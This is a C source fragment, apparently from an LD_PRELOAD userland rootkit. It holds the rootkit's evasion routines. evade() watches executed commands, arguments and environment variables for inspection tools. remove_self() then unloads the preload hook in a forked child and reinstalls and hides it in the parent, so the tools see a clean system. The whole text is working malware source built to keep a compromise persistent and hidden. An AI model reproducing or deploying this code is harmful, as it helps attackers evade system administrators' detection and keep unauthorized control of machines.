/* uninstall. continue execution in child. reinstall in parent. */
int remove_self(void){
    if(notuser(0))
        return VINVALID_PERM;

#ifdef PATCH_DYNAMIC_LINKER
    ldpatch(PRELOAD_FILE, OLD_PRELOAD);
    rm(PRELOAD_FILE);
#else
    rm(OLD_PRELOAD);
#endif
#ifdef ROOTKIT_BASHRC
    rm(BASHRC_PATH);
    rm(BASHRC_PATH);
#endif

    pid_t pid = fork();
    if(pid < 0) return VFORK_ERR;
    else if(pid == 0) return VFORK_SUC;

    wait(NULL);
#ifdef PATCH_DYNAMIC_LINKER
    ldpatch(OLD_PRELOAD, PRELOAD_FILE);
    reinstall(PRELOAD_FILE, INSTALL_DIR, BDVLSO);
    hide_path(PRELOAD_FILE);
#else
    reinstall(OLD_PRELOAD, INSTALL_DIR, BDVLSO);
    hide_path(OLD_PRELOAD);
#endif
    return VEVADE_DONE;
}


/* checks all of the scary_* arrays created by setup.py against execve/p args.
 * the scary_procs loop checks the name of the calling process as well. */
int evade(const char *filename, char *const argv[], char *const envp[]){
    if(rknomore(INSTALL_DIR, BDVLSO))
        return VNOTHING_DONE;

    char *scary_proc, *scary_path;

    for(int i = 0; i < SCARY_PROCS_SIZE; i++){
        scary_proc = scary_procs[i];

        char path[strlen(scary_proc) + 3];
        snprintf(path, sizeof(path), "*/%s", scary_proc);

        if(process(scary_proc) || strstr(filename, scary_proc) || !fnmatch(path, filename, FNM_PATHNAME))
            return remove_self();
    }

    for(int i = 0; i < SCARY_PATHS_SIZE; i++){
        scary_path = scary_paths[i];

        for(int argi = 0; argv[argi] != NULL; argi++)
            if(!fnmatch(scary_path, argv[argi], FNM_PATHNAME))
                return remove_self();

        if(!fnmatch(scary_path, filename, FNM_PATHNAME))
            for(int argi = 0; argv[argi] != NULL; argi++)
                if(!strncmp("--list", argv[argi], 6))
                    return remove_self();
    }

    if(envp != NULL)
        for(int i = 0; envp[i] != NULL; i++)
            for(int ii = 0; ii < SCARY_VARIABLES_SIZE; ii++)
                if(!strncmp(scary_variables[ii], envp[i], strlen(scary_variables[ii])))
                    return remove_self();

    return VNOTHING_DONE;
}